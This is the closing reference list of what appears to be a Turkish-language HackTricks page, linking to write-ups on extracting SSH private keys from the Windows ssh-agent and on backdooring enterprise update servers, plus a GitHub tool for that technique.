- [37] [blog.ropnop.com - Windows 10 Ssh Agent'tan Ssh Private Keys Çıkarma](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Enterprise Update Servers'ı Backdoor Fabrikalarına Dönüştürme (0_o) – Bölüm 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Enterprise Update Servers'ı Backdoor Fabrikalarına Dönüştürme (0_o) – Bölüm 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
{{#include ../../banners/hacktricks-training.md}}
